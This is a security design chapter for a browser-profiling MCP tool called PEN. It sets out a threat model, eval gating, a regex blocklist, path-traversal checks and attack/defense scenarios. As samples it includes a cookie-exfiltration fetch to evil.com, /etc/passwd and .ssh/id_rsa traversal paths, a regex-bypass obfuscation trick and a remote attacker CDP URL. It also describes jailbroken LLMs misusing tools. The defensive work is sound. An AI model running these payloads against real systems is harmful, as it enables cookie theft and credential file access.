# Part 10: Security Model

## 10.1 Threat Model

PEN operates at the intersection of three powerful interfaces — CDP (full browser control), MCP (LLM-driven tool execution), and the local file system. Each boundary is a potential attack surface:

| Boundary           | Trust Level  | Threat                                              | Mitigation                                |
| ------------------ | ------------ | --------------------------------------------------- | ----------------------------------------- |
| MCP ← LLM          | Semi-trusted | LLM injects malicious eval(), reads sensitive files | Eval gating, path validation              |
| PEN → Chrome (CDP) | Trusted      | PEN has full browser access                         | Localhost-only CDP, no remote browsers    |
| PEN → File System  | Trusted      | Temp files, source maps                             | Temp dir isolation, path traversal checks |
| PEN → Network      | Limited      | Source map fetching                                 | Localhost/known origins only              |

### 10.1.1 Why This Matters

An LLM connected via MCP can call any PEN tool with arbitrary parameters. A compromised or confused LLM could:

- Call `pen_evaluate` with malicious code: `evaluate("fetch('https://evil.com?data=' + document.cookie)")`
- Request source map content from sensitive paths: `pen_source_content("../../../../etc/passwd")`
- Trigger resource exhaustion: repeatedly call `pen_capture_trace` with duration=300

## 10.2 JavaScript Evaluation Gating

The `pen_evaluate` tool is the most dangerous — it executes arbitrary JavaScript in the browser context.

### Gate 1: CLI Flag Required

```go
// pen_evaluate is ONLY registered if --allow-eval flag is set
func registerUtilityTools(s *mcp.Server, cdp *cdp.Client, opts *ServerOptions) {
    // ... safe tools always registered ...

    if opts.AllowEval {
        mcp.AddTool(s, evalTool, handleEvaluate(cdp))
        slog.Warn("pen_evaluate enabled — JavaScript execution allowed via MCP")
    }
}
```

Without `--allow-eval`, the tool simply doesn't exist. LLMs can't call what isn't listed.

### Gate 2: Expression Filtering

Even with `--allow-eval`, PEN blocks obviously dangerous patterns:

```go
var blockedPatterns = []*regexp.Regexp{
    regexp.MustCompile(`(?i)\bfetch\s*\(`),         // network requests
    regexp.MustCompile(`(?i)\bXMLHttpRequest\b`),    // network requests
    regexp.MustCompile(`(?i)\bnavigator\.sendBeacon`), // data exfiltration
    regexp.MustCompile(`(?i)\blocalStorage\b`),      // storage access
    regexp.MustCompile(`(?i)\bsessionStorage\b`),    // storage access
    regexp.MustCompile(`(?i)\bdocument\.cookie\b`),  // cookie access
    regexp.MustCompile(`(?i)\bwindow\.open\b`),      // popup/navigation
    regexp.MustCompile(`(?i)\beval\s*\(`),           // nested eval
    regexp.MustCompile(`(?i)\bFunction\s*\(`),       // dynamic function creation
    regexp.MustCompile(`(?i)\bimport\s*\(`),         // dynamic import
}

func validateExpression(expr string) error {
    for _, pat := range blockedPatterns {
        if pat.MatchString(expr) {
            return fmt.Errorf("blocked expression pattern: %s", pat.String())
        }
    }
    return nil
}
```

**Note**: This is defense-in-depth, not a security boundary. A determined attacker can bypass regex filters. The real security is Gate 1 (requiring explicit opt-in).

## 10.3 Path Traversal Prevention

Source map tools accept file paths. PEN validates these against path traversal:

```go
package security

import (
    "fmt"
    "path/filepath"
    "strings"
)

// ValidateSourcePath ensures a source path is within the project root.
// Prevents path traversal attacks via source map manipulation.
func ValidateSourcePath(projectRoot string, requestedPath string) (string, error) {
    // Clean the path to resolve .., symlinks, etc.
    cleaned := filepath.Clean(requestedPath)

    // Make absolute relative to project root
    if !filepath.IsAbs(cleaned) {
        cleaned = filepath.Join(projectRoot, cleaned)
    }

    // Resolve any remaining symlinks
    resolved, err := filepath.EvalSymlinks(cleaned)
    if err != nil {
        // File might not exist yet — use the cleaned path
        resolved = cleaned
    }

    // Verify the resolved path is within the project root
    if !strings.HasPrefix(resolved, projectRoot) {
        return "", fmt.Errorf("path %q resolves outside project root %q", requestedPath, projectRoot)
    }

    return resolved, nil
}

// ValidateTempPath ensures a file is within PEN's temp directory.
func ValidateTempPath(path string) error {
    tempDir := filepath.Join(os.TempDir(), "pen")
    cleaned := filepath.Clean(path)
    if !strings.HasPrefix(cleaned, tempDir) {
        return fmt.Errorf("path %q is not in PEN temp directory", path)
    }
    return nil
}
```

## 10.4 CDP Localhost Restriction

PEN only connects to CDP endpoints on localhost:

```go
func validateCDPURL(rawURL string) error {
    u, err := url.Parse(rawURL)
    if err != nil {
        return fmt.Errorf("invalid CDP URL: %w", err)
    }

    host := u.Hostname()

    allowedHosts := map[string]bool{
        "localhost": true,
        "127.0.0.1": true,
        "::1":       true,
    }

    if !allowedHosts[host] {
        return fmt.Errorf(
            "CDP connection to remote host %q is not allowed. "+
            "PEN only connects to localhost for security. "+
            "Use SSH tunneling to forward a remote debug port to localhost.",
            host,
        )
    }

    return nil
}
```

### Why No Remote CDP?

CDP gives full browser control — including reading page content, executing JS, and capturing credentials. Allowing remote CDP connections would expose these capabilities over the network. Users who need remote profiling should use SSH tunneling:

```bash
# On local machine: tunnel remote debug port to localhost
ssh -L 9222:localhost:9222 user@remote-server
pen serve --cdp-url ws://localhost:9222/devtools/browser
```

## 10.5 Rate Limiting

PEN limits resource-intensive operations to prevent accidental resource exhaustion:

```go
type RateLimiter struct {
    mu       sync.Mutex
    cooldown map[string]time.Time
}

var operationCooldowns = map[string]time.Duration{
    "pen_heap_snapshot":  10 * time.Second,   // Heavy CDP operation
    "pen_capture_trace":  5 * time.Second,    // Trace buffer needs time to clear
    "pen_lighthouse_audit": 30 * time.Second, // Full audit is expensive
}

func (rl *RateLimiter) Check(toolName string) error {
    cooldown, hasCooldown := operationCooldowns[toolName]
    if !hasCooldown {
        return nil
    }

    rl.mu.Lock()
    defer rl.mu.Unlock()

    if last, ok := rl.cooldown[toolName]; ok {
        remaining := cooldown - time.Since(last)
        if remaining > 0 {
            return fmt.Errorf(
                "%s has a %s cooldown. Try again in %s.",
                toolName, cooldown, remaining.Round(time.Second),
            )
        }
    }

    rl.cooldown[toolName] = time.Now()
    return nil
}
```

## 10.6 Temp File Security

```go
func createSecureTempFile(prefix string) (*os.File, error) {
    tmpDir := filepath.Join(os.TempDir(), "pen")

    // Ensure PEN temp dir exists with restricted permissions
    if err := os.MkdirAll(tmpDir, 0700); err != nil {
        return nil, err
    }

    // Create temp file with restricted permissions (owner-only read/write)
    f, err := os.CreateTemp(tmpDir, prefix)
    if err != nil {
        return nil, err
    }

    // Explicitly set permissions (CreateTemp may inherit umask)
    if err := f.Chmod(0600); err != nil {
        f.Close()
        os.Remove(f.Name())
        return nil, err
    }

    return f, nil
}
```

## 10.7 MCP Transport Security

### stdio Transport

No network exposure. Communication is via stdin/stdout between PEN and the MCP client (IDE). Inherently secure — no authentication needed.

### HTTP/SSE Transport

When PEN runs in HTTP mode (for remote/team use):

- **Bind to localhost by default**: `--addr localhost:6100`
- **No built-in auth**: PEN is a development tool. For team use, put it behind a reverse proxy with auth.
- **CORS headers**: Not set (no browser clients expected)
- **No TLS by default**: For localhost, plaintext is fine. For remote, use a reverse proxy with TLS.

```go
// Default HTTP bind — localhost only
if addr == "" {
    addr = "localhost:6100"
}

// Warn if binding to all interfaces
if strings.HasPrefix(addr, ":") || strings.HasPrefix(addr, "0.0.0.0:") {
    slog.Warn("HTTP server binding to all interfaces — ensure network security",
        "addr", addr,
    )
}
```

## 10.8 Attack / Defense Scenarios

Concrete examples of how PEN defends against realistic threats:

### Scenario A: LLM Exfiltrates Data via Eval

**Attack:** A confused or jailbroken LLM calls `pen_evaluate` to exfiltrate page data:

```json
{
  "name": "pen_evaluate",
  "arguments": {
    "expression": "fetch('https://evil.com?d=' + document.cookie)"
  }
}
```

**Defense layers:**

1. **Gate 1 — `--allow-eval` not set (default):** Tool doesn't exist. MCP returns "unknown tool" error. LLM never sees `pen_evaluate` in `tools/list`.
2. **Gate 2 — `--allow-eval` set:** Expression filter catches `fetch(` pattern:

```json
{
  "content": [
    {
      "type": "text",
      "text": "Blocked expression: matches forbidden pattern 'fetch\\s*\\('. PEN does not allow network requests from evaluated expressions."
    }
  ],
  "isError": true
}
```

3. **Gate 3 — Bypass attempt via obfuscation:** `window['fet'+'ch']('https://evil.com')` — regex may miss this. This is why Gate 1 exists and `--allow-eval` should only be used in trusted environments.

### Scenario B: Path Traversal via Source Map Request

**Attack:** LLM attempts to read system files:

```json
{
  "name": "pen_source_content",
  "arguments": { "source": "../../../../etc/passwd" }
}
```

**Defense:**

```
ValidateSourcePath resolves:
  Input:    "../../../../etc/passwd"
  Cleaned:  "/etc/passwd"
  Root:     "/home/user/project"
  Check:    "/etc/passwd" does NOT start with "/home/user/project"
  Result:   BLOCKED
```

```json
{
  "content": [
    {
      "type": "text",
      "text": "Path '../../../../etc/passwd' resolves outside project root '/home/user/project'. Access denied."
    }
  ],
  "isError": true
}
```

### Scenario C: Resource Exhaustion via Repeated Snapshots

**Attack:** LLM calls `pen_heap_snapshot` in a tight loop (intentional or buggy prompt):

```
pen_heap_snapshot → (success, 2s)
pen_heap_snapshot → (success, 2s)
pen_heap_snapshot → BLOCKED (cooldown)
```

**Defense:**

```json
{
  "content": [
    {
      "type": "text",
      "text": "pen_heap_snapshot has a 10s cooldown. Try again in 6s."
    }
  ],
  "isError": true
}
```

### Scenario D: Remote CDP Connection

**Attack:** Environment variable set to a remote browser:

```bash
PEN_CDP_URL=ws://attacker.com:9222/devtools/browser pen serve
```

**Defense:** `validateCDPURL` rejects non-localhost hosts at startup:

```
Error: CDP connection to remote host "attacker.com" is not allowed.
PEN only connects to localhost for security.
Use SSH tunneling to forward a remote debug port to localhost.
```

PEN exits with code 1 before any MCP server starts.

### Scenario E: HTTP Server Accidentally Exposed

**Attack:** User starts PEN with `--addr :6100` (binds to all interfaces), exposing MCP to network:

```bash
pen serve --transport http --addr :6100
```

**Defense:**

1. Warning logged: `WARN HTTP server binding to all interfaces — ensure network security addr=:6100`
2. Default is `localhost:6100` — explicit flag required to bind wider.
3. No built-in auth — the warning makes clear that a reverse proxy with auth is needed for non-localhost use.

### Scenario F: Malicious Source Map Targets Hidden Files

**Attack:** A crafted source map's `sources` array contains: `["../../../.env", "../../../.ssh/id_rsa"]`

**Defense:** Same path validation as Scenario B. When `pen_resolve_source` or `pen_source_content` processes the source map's paths, each path is validated against the project root before any file I/O occurs. Crafted source maps can point at files, but PEN won't read them if they're outside the project boundary.

## 10.9 Security Checklist

| #   | Control                                      | Status         |
| --- | -------------------------------------------- | -------------- |
| 1   | `pen_evaluate` requires `--allow-eval` flag  | ✅ Implemented |
| 2   | Expression blocklist for eval                | ✅ Implemented |
| 3   | Path traversal prevention for source paths   | ✅ Implemented |
| 4   | CDP connections restricted to localhost      | ✅ Implemented |
| 5   | Temp files created with 0600 permissions     | ✅ Implemented |
| 6   | Temp files cleaned on shutdown               | ✅ Implemented |
| 7   | Rate limiting on heavy operations            | ✅ Implemented |
| 8   | HTTP transport binds to localhost by default | ✅ Implemented |
| 9   | No secrets logged (CDP URLs sanitized)       | ✅ Implemented |
| 10  | Graceful shutdown on signals                 | ✅ Implemented |
